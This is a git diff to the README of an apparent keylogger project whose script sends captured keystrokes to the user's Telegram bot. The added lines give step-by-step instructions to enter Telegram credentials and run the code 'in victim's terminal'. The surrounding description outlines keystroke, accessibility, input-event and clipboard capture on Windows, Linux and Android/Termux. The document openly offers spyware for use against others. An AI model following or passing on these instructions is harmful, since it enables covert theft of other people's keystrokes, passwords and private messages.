@@ -88,10 +88,17 @@ https://youtu.be/DRilJ2Xj_9U?si=82im4sEc8ftZmV4f
 
 ![Telegram Demo 2](screenshots/proof_2.png)
 
+##Step by step process 
+```python
+1.Download the requirements 
+2.Replace your telegram account credentials in the python code according to the image
+3.Execute the python code in victim's terminal
+4.Then keystrokes will automatically comes to your telegram_chat_bot
+```
+
 ## High-level analysis of Keylogger.py
-
+```python
 This script is designed to:
-
 1.Collect keyboard input
     On Windows/Linux desktops it uses the pynput library to monitor key presses.
     On Android (Termux) it attempts several methods to gather input-related events.
@@ -109,3 +116,4 @@ This script is designed to:
 6.Support multiple platforms
     Windows/Desktop Linux: keyboard listener.
     Android/Termux: accessibility, input-event, and clipboard-monitoring approaches.
+```
